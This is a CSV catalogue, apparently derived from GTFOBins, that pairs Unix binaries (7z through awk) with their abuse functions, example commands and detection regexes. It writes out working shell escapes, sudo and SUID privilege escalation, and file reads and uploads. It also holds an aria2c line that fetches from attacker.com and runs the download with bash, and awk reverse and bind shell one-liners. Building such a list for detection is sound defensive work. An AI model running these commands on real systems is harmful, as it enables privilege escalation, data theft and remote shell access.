"Name","Function","ExampleCode","RegexStrictV8","Notes"
"7z","file-read","7z a -ttar -an -so $LFILE | 7z e -ttar -si -so","(?i)\b(?:\S*/)?7z\b.*.+",""
"7z","sudo","sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so","(?i)\b(?:\S*/)?sudo\b.*.+",""
"aa-exec","shell","aa-exec /bin/sh","(?i)\b(?:\S*/)?aa\-exec\b.*/bin/sh",""
"aa-exec","suid","./aa-exec /bin/sh -p","(?i)\b(?:\S*/)?aa\-exec\b.*/bin/sh",""
"aa-exec","sudo","sudo aa-exec /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"ab","file-upload","ab -p $LFILE $URL","(?i)\b(?:\S*/)?ab\b.*.+",""
"ab","file-download","ab -v2 $URL","(?i)\b(?:\S*/)?ab\b.*.+",""
"ab","suid","./ab -p $LFILE $URL","(?i)\b(?:\S*/)?ab\b.*.+",""
"ab","sudo","sudo ab -p $LFILE $URL","(?i)\b(?:\S*/)?sudo\b.*.+",""
"agetty","suid","./agetty -o -p -l /bin/sh -a root tty","(?i)\b(?:\S*/)?agetty\b.*/bin/sh",""
"alpine","file-read","alpine -F ""$LFILE""","(?i)\b(?:\S*/)?alpine\b.*(?:""[^""]+""|\'[^\']+\')",""
"alpine","suid","./alpine -F ""$LFILE""","(?i)\b(?:\S*/)?alpine\b.*(?:""[^""]+""|\'[^\']+\')",""
"alpine","sudo","sudo alpine -F ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"ansible-playbook","shell","echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"ansible-playbook","sudo","echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"ansible-test","shell","ansible-test shell","(?i)\b(?:\S*/)?ansible\-test\b.*.+",""
"ansible-test","sudo","sudo ansible-test shell","(?i)\b(?:\S*/)?sudo\b.*.+",""
"aoss","shell","aoss /bin/sh","(?i)\b(?:\S*/)?aoss\b.*/bin/sh",""
"aoss","sudo","sudo aoss /bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"apache2ctl","file-read","apache2ctl -c ""Include $LFILE"" -k stop","(?i)\b(?:\S*/)?apache2ctl\b.*\-c",""
"apache2ctl","sudo","sudo apache2ctl -c ""Include $LFILE"" -k stop","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"apt-get","shell","apt-get changelog apt
!/bin/sh","(?i)\b(?:\S*/)?apt\-get\b.*/bin/sh",""
"apt-get","sudo","sudo apt-get changelog apt
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"apt-get","sudo","echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"apt-get","sudo","sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"apt","shell","apt changelog apt
!/bin/sh","(?i)\b(?:\S*/)?apt\b.*/bin/sh",""
"apt","sudo","sudo apt changelog apt
!/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"apt","sudo","echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl","(?i)\b(?:\S*/)?echo\b.*/bin/sh.*\-c",""
"apt","sudo","sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh","(?i)\b(?:\S*/)?sudo\b.*/bin/sh",""
"ar","file-read","ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)\b(?:\S*/)?ar\b.*(?:""[^""]+""|\'[^\']+\')",""
"ar","suid","./ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)\b(?:\S*/)?ar\b.*(?:""[^""]+""|\'[^\']+\')",""
"ar","sudo","sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"aria2c","command","echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"aria2c","command","aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa","(?i)\b(?:\S*/)?aria2c\b.*\-c",""
"aria2c","file-download","aria2c -o ""$LFILE"" ""$URL""","(?i)\b(?:\S*/)?aria2c\b.*(?:""[^""]+""|\'[^\']+\')",""
"aria2c","sudo","echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"aria2c","limited-suid","echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"arj","file-read","arj a ""$TF"" ""$LFILE""
arj p ""$TF""","(?i)\b(?:\S*/)?arj\b.*(?:""[^""]+""|\'[^\']+\')",""
"arj","file-write","echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"arj","sudo","echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"arj","suid","echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"arp","file-read","arp -v -f ""$LFILE""","(?i)\b(?:\S*/)?arp\b.*(?:""[^""]+""|\'[^\']+\')",""
"arp","suid","./arp -v -f ""$LFILE""","(?i)\b(?:\S*/)?arp\b.*(?:""[^""]+""|\'[^\']+\')",""
"arp","sudo","sudo arp -v -f ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"as","file-read","as @$LFILE","(?i)\b(?:\S*/)?as\b.*.+",""
"as","suid","./as @$LFILE","(?i)\b(?:\S*/)?as\b.*.+",""
"as","sudo","sudo as @$LFILE","(?i)\b(?:\S*/)?sudo\b.*.+",""
"ascii-xfr","file-read","ascii-xfr -ns ""$LFILE""","(?i)\b(?:\S*/)?ascii\-xfr\b.*(?:""[^""]+""|\'[^\']+\')",""
"ascii-xfr","suid","./ascii-xfr -ns ""$LFILE""","(?i)\b(?:\S*/)?ascii\-xfr\b.*(?:""[^""]+""|\'[^\']+\')",""
"ascii-xfr","sudo","sudo ascii-xfr -ns ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"ascii85","file-read","ascii85 ""$LFILE"" | ascii85 --decode","(?i)\b(?:\S*/)?ascii85\b.*(?:""[^""]+""|\'[^\']+\')",""
"ascii85","sudo","sudo ascii85 ""$LFILE"" | ascii85 --decode","(?i)\b(?:\S*/)?sudo\b.*(?:""[^""]+""|\'[^\']+\')",""
"ash","shell","ash","(?i)\b(?:\S*/)?ash\b.*.+",""
"ash","file-write","ash -c 'echo DATA > $LFILE'","(?i)\b(?:\S*/)?ash\b.*\-c",""
"ash","suid","./ash","(?i)\b(?:\S*/)?ash\b.*.+",""
"ash","sudo","sudo ash","(?i)\b(?:\S*/)?sudo\b.*.+",""
"aspell","file-read","aspell -c ""$LFILE""","(?i)\b(?:\S*/)?aspell\b.*\-c",""
"aspell","suid","./aspell -c ""$LFILE""","(?i)\b(?:\S*/)?aspell\b.*\-c",""
"aspell","sudo","sudo aspell -c ""$LFILE""","(?i)\b(?:\S*/)?sudo\b.*\-c",""
"at","shell","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"at","command","echo ""$COMMAND"" | at now","(?i)\b(?:\S*/)?echo\b.*(?:""[^""]+""|\'[^\']+\')",""
"at","sudo","echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null","(?i)\b(?:\S*/)?echo\b.*/bin/sh",""
"atobm","file-read","atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)\b(?:\S*/)?atobm\b.*printf",""
"atobm","sudo","sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)\b(?:\S*/)?sudo\b.*printf",""
"atobm","suid","./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'","(?i)\b(?:\S*/)?atobm\b.*printf",""
"awk","shell","awk 'BEGIN {system(""/bin/sh"")}'","(?i)\b(?:\S*/)?awk\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*BEGIN",""
"awk","non-interactive-reverse-shell","awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)\b(?:\S*/)?awk\b.*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*if\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/inet/tcp/0/.*/inet/tcp.*BEGIN.*printf.*getline.*close",""
"awk","non-interactive-bind-shell","awk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)\b(?:\S*/)?awk\b.*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*if\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*while\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*close\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))(?:\s*,\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+)))*\s*\).*/inet/tcp.*BEGIN.*printf.*getline.*close",""
"awk","file-write","awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)\b(?:\S*/)?awk\b.*BEGIN",""
"awk","file-read","awk '//' ""$LFILE""","(?i)\b(?:\S*/)?awk\b.*(?:""[^""]+""|\'[^\']+\')",""
"awk","suid","./awk '//' ""$LFILE""","(?i)\b(?:\S*/)?awk\b.*(?:""[^""]+""|\'[^\']+\')",""
"awk","sudo","sudo awk 'BEGIN {system(""/bin/sh"")}'","(?i)\b(?:\S*/)?sudo\b.*system\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$\{?[A-Za-z_][A-Za-z0-9_]*\}?|\$[A-Za-z_][A-Za-z0-9_]*)|(?:[A-Za-z0-9_\-./]+))\s*\).*/bin/sh.*BEGIN",""
